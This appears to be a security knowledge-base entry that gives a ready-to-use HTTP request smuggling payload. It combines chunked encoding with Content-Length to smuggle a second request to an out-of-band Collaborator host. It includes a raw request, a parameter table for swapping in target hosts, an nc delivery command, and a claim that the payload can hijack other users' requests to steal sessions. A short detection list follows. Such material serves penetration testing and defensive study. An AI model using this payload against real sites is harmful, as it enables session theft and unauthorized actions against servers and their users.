---
type: code
language: http
verified: true
platforms:
  - web
tags:
  - http-smuggling
  - payload
  - web-exploitation
  - chunked-encoding
validated: true
---

# HTTP Request Smuggling Chunked Transfer Payload

## Code

```http
GET /  HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83

0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```

## Description

This payload exploits TE.CL or similar variants by using a zero-length chunk to prematurely end the body, smuggling a second GET request. It can hijack subsequent user requests to steal sessions or perform unauthorized actions.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| something.com | Target host | $_TARGET_HOST |
| something.burpcollaborator.net | OOB URL for exfiltration/verification | $_COLLABORATOR_URL |
| 83 | Content-Length (must match bytes before chunk; adjust if editing) | Calculated |

## Usage

Deliver via raw socket (e.g., nc $_TARGET_HOST 80 < payload.txt) or proxy after a probe. Monitor for smuggled request execution, such as Collaborator interactions or altered responses to following requests.

## Detection

- Anomalous chunked requests with zero chunks followed by new headers.
- Backend logs showing unexpected requests without front-end matches.
- Increased OOB traffic or cache poisoning indicators.

## Related

- [[procedures/http-request-smuggling-detection-and-exploitation]]
- [[tools/smuggler]]
